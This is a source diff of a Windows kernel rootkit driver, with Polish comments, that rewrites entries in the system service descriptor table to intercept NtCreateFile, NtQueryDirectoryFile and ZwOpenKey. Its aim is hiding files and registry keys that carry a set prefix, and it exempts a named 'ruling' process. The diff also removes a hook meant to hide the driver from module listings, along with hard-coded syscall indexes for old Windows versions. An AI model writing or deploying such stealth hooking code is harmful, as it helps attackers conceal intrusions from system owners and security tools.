@@ -5,38 +5,18 @@
 #include "rootkit.h"
 #include "rk_Tools.h"
 
-//
-//	Native API indexes.
-//
 
-extern ROOTKIT_SETUP_DATA	offsets;
-extern PMODULE_ENTRY		gp_HiddenDriver;
-extern ULONG				gp_ImageDelta;
-
-//Win2k Prof. SP4
-NTAPI_LIST bn2195 = { 0xA , 0x20, 0x7D , 0xD9, 0x97};	// sprawdzic ostatnie!!!!!
-
-//WinXP Prof. SP0
-NTAPI_LIST bnXP =	{ 0xB , 0x25, 0x91 , 0xF9, 0xad};
-
-//Win2k3 Server SP1
-NTAPI_LIST bn2k3 =	{ 0xc , 0x27, 0x97 , 0x102, 0xb5}; 
-
-//extern WCHAR hidePrefixW[];
+extern API_INDEXES    currentAPI;
+extern NTOSKRNL_OFFSETS	offsets;
 extern UNICODE_STRING hidePrefixW;
 extern char *hidePrefixA;
-extern char *masterPrefix;
+extern char *rulingProcess;
 
-//extern NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile;
-NTQUERYDIRECTORYFILE		OrgNtQueryDirectoryFile = NULL;
-NTCREATEFILE				OrgNtCreateFile;
-NTQUERYSYSTEMINFORMATION	OrgNtQuerySystemInformation = NULL;
-ZWOPENKEY                   OrgZwOpenKey;
+NTQUERYDIRECTORYFILE		OldNtQueryDirectoryFile = NULL;
+NTCREATEFILE				OldNtCreateFile;
+ZWOPENKEY                   OldZwOpenKey;
 
-BOOLEAN gb_ApisHooked = FALSE;
-
-NTAPI_LIST	g_ApiList = {0};
-
+BOOLEAN bHooked = FALSE;
 
 NTSTATUS NewZwQueryDirectoryFile(
 	IN HANDLE hFile,
@@ -52,86 +32,63 @@ NTSTATUS NewZwQueryDirectoryFile(
 	IN BOOLEAN bRestartQuery
 );
 
-VOID SetupIndexes()
-{
-	ULONG  BuildNumber;
-
-	DbgPrint("Setting up hooking indexes");
-
-	//no NTAPI indexes specified so choose one
-	BuildNumber = (NtBuildNumber & 0x0000FFFF);
-	switch (BuildNumber)
-	{
-	case 2195:
-		g_ApiList = bn2195;
-		DbgPrint("Win2k BN:2195 recongnized\n");
-		break;
-	case 2600:
-		g_ApiList = bnXP;
-		DbgPrint("WinXP BN:%d recongnized\n",BuildNumber);
-		break;
-	case 3790:
-		g_ApiList = bn2k3;
-		DbgPrint("Win2k3 BN:%d recongnized\n",BuildNumber);
-		break;
-	default:
-		DbgPrint("OS UNSUPPORTED!!!\n");
-	}
-}
-
+/*
+* Zalozenie hookow na okreslone funkcje w tablicy SSDT.
+* Przechwytujemy wywolania funkcji (us³ug systemowych):
+* - NtCreateFile 
+* - NtQueryDirectoryFile                   
+* - NtOpenKey
+*/
 VOID HookApis()
 {
-	KIRQL tmpIrql;
+	KIRQL irql;
 
-	if (!gb_ApisHooked)
+	if (!bHooked)
 	{
-		tmpIrql = RaiseIRQLevel();
+		irql = RaiseIRQLevel();
 
 		WPOFF();
 		DbgPrint("Hooking SSD table \n");
 		// NtCreateFile
-		OrgNtCreateFile	= SYSCALL( g_ApiList.NtCreateFileIndex );
-		SYSCALL( g_ApiList.NtCreateFileIndex ) = HookNtCreateFile;
+		OldNtCreateFile	= SYSCALL( currentAPI.NtCreateFileIndex );
+		SYSCALL( currentAPI.NtCreateFileIndex ) = HookNtCreateFile;
 
 		// NtQueryDirectoryFile
-		OrgNtQueryDirectoryFile	= SYSCALL( g_ApiList.NtQueryDirectoryFileIndex );
-//		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;
-		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = NewZwQueryDirectoryFile;
+		OldNtQueryDirectoryFile	= SYSCALL( currentAPI.NtQueryDirectoryFileIndex );
+		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = NewZwQueryDirectoryFile;
 
-        OrgZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
-        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
-		// NtQueryDirectoryFile
-//		OrgNtQuerySystemInformation	= SYSCALL( g_ApiList.NtQuerySystemInformationIndex );
-//		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = HookNtQuerySystemInformation;
+//        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
+//        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
 
-		gb_ApisHooked = TRUE;
+		bHooked = TRUE;
 		WPON();
 
-		LowerIRQLevel( tmpIrql );
+		LowerIRQLevel( irql );
     }
 }
 
+/*
+*   Zdjecie hookow z tablicy SSDT.
+*/
 VOID UnHookApis()
 {
-	KIRQL tmpIrql;
+	KIRQL irql;
 
-	if (gb_ApisHooked)
+	if (bHooked)
 	{
-		// raising IRQLEVEL - this should keep race conditions away from us
-		tmpIrql = RaiseIRQLevel();
+ 
+		irql = RaiseIRQLevel();
 
-		DbgPrint("Unhooking SSD table \n");
 		WPOFF();
 
-		SYSCALL( g_ApiList.NtCreateFileIndex ) = OrgNtCreateFile;	
-		SYSCALL( g_ApiList.NtQueryDirectoryFileIndex ) = OrgNtQueryDirectoryFile;	
-        SYSTEMSERVICE( ZwOpenKey ) = OrgZwOpenKey;
-//		SYSCALL( g_ApiList.NtQuerySystemInformationIndex ) = OrgNtQuerySystemInformation;
+		SYSCALL( currentAPI.NtCreateFileIndex ) = OldNtCreateFile;	
+		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
+//        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
 
-		gb_ApisHooked = FALSE;
+		bHooked = FALSE;
 		WPON();
 
-		LowerIRQLevel( tmpIrql );
+		LowerIRQLevel( irql );
 	}
 }
 
@@ -146,8 +103,7 @@ HookZwOpenKey(
         WCHAR buf[1024]; 
         
 //        DbgPrint("Entered HookZwOpenKey\n");
-		/* open the key, as normal */
-        rc=((ZWOPENKEY)(OrgZwOpenKey)) (
+        rc=((ZWOPENKEY)(OldZwOpenKey)) (
 			phKey,
 			DesiredAccess,
 			ObjectAttributes );
@@ -161,65 +117,6 @@ HookZwOpenKey(
 		return rc;
 }
 
-NTSTATUS
-HookNtQuerySystemInformation(
-    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    IN OUT PVOID SystemInformation,
-    IN ULONG SystemInformationLength,
-    OUT PULONG ReturnLength OPTIONAL
-    )
-{
-	NTSTATUS status;
-	PMODULE_INFO pmKernelInfo = NULL;
-	PMODULE_INFO pmRootkitInfo = NULL;
-	PMODULE_LIST pModuleList = NULL;
-	ULONG i;
-	SHORT w_string;
-
-	status = OrgNtQuerySystemInformation(SystemInformationClass,
-											SystemInformation,
-											SystemInformationLength,
-											ReturnLength);
-
-	if (SystemInformationClass == SystemModuleInformation) {		
-		__asm int 3
-		if (SystemInformationLength > 0) {
-			DbgPrint("ReturnLength: %ld\n",ReturnLength);
-			DbgPrint("OrgNtQuerySystemInformation hooked;)\n");
-			pModuleList = (PMODULE_LIST)SystemInformation;
-			for (i=0;i<pModuleList->d_modules; i++ ) {	
-//				if (&pModuleList->a_moduleInfo[i].a_bPath[0] < &pModuleList->a_moduleInfo[i])
-//					continue;
-				if (pModuleList->a_moduleInfo[i].p_Base > 0 && pModuleList->a_moduleInfo[i].w_NameOffset > 0) {
-
-					//DbgPrint("a_moduleInfo[i]: %x\n",&pModuleList->a_moduleInfo[i]);
-					//DbgPrint("d_Flags: %x\n",pModuleList->a_moduleInfo[i].d_Flags);
-					//DbgPrint("a_bPath: %x\n",pModuleList->a_moduleInfo[i].a_bPath);
-					//DbgPrint("d_Reserved1: %x\n",pModuleList->a_moduleInfo[i].d_Reserved1);
-					//DbgPrint("d_Reserved2: %x\n",pModuleList->a_moduleInfo[i].d_Reserved2);
-					//DbgPrint("w_Index: %x\n",pModuleList->a_moduleInfo[i].w_Index);
-					//DbgPrint("p_Base: %x\n",pModuleList->a_moduleInfo[i].p_Base);
-					//DbgPrint("d_Size: %x\n",pModuleList->a_moduleInfo[i].d_Size);
-					//DbgPrint("w_NameOffset: %x\n",pModuleList->a_moduleInfo[i].w_NameOffset);
-					//DbgPrint("--------\n");
-					if ( _stricmp( pModuleList->a_moduleInfo[i].a_bPath + pModuleList->a_moduleInfo[i].w_NameOffset, "ntoskrnl.exe") == 0) {
-						pmKernelInfo = &pModuleList->a_moduleInfo[i];
-					}
-				}
-			}
-	//		pmKernelInfo = FindModuleByName( (PMODULE_LIST)SystemInformation, "ntoskrnl.exe", 12);
-			//if (pmKernelInfo!=NULL) {
-			//	DbgPrint("pmKernelInfo->d_Size: %ld\n",pmKernelInfo->d_Size);
-			//	pmKernelInfo->d_Size = ((ULONG)gp_HiddenDriver->base - (ULONG)pmKernelInfo->p_Base)+gp_HiddenDriver->unk1;
-			//	//pmKernelInfo->d_Size = pmKernelInfo->d_Size + gp_ImageDelta;
-			//}
-			//else
-			//	DbgPrint("pmKernelInfo is NULL pointer \n");
-		}
-	}
-		
-	return status;
-}
 //--------------------------------------------------------------------------
 
 
@@ -245,7 +142,7 @@ NTSTATUS NewZwQueryDirectoryFile(
 //	GetProcessName( aProcessName );                                        
 //	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);
 
-	rc=OrgNtQueryDirectoryFile(
+	rc=OldNtQueryDirectoryFile(
 			hFile,							/* this is the directory handle */
 			hEvent,
 			IoApcRoutine,
@@ -338,7 +235,7 @@ NTSTATUS HookNtQueryDirectoryFile(
 	int iPos;
 	int iLeft;
 
-	rc = OrgNtQueryDirectoryFile(
+	rc = OldNtQueryDirectoryFile(
 			hFile,
 			hEvent,
 			IoApcRoutine,
@@ -447,7 +344,7 @@ NTSTATUS HookNtCreateFile(
 
 pass_throught:
 
-	return OrgNtCreateFile(
+	return OldNtCreateFile(
 					FileHandle,
 					DesiredAccess,
 					ObjectAttributes,
@@ -467,13 +364,10 @@ BOOLEAN IsPriviligedProcess( PEPROCESS eproc )
 	ULONG len = 0;
 	PCHAR processName = NULL;
 	if ( eproc ) {
-		processName = (PCHAR) ( (ULONG)eproc + offsets.nameOffset );
-//		DbgPrint("CurrentEprocess: %x, processName: %x\n",eproc,processName);
+		processName = (PCHAR) ( (ULONG)eproc + offsets.processName );
 		if (processName) {
-			len = strlen(masterPrefix);
-//			DbgPrint("Master prefix: %s, [%ld]n",masterPrefix,len);
-			// WARNING MUST BE LESS THAN 16 !!!! EPROC HAVOC
-			if ( RtlCompareMemory( processName, masterPrefix, len ) == len )
+			len = strlen(rulingProcess);
+			if ( RtlCompareMemory( processName, rulingProcess, len ) == len )
 				return TRUE;
 		}
 	}
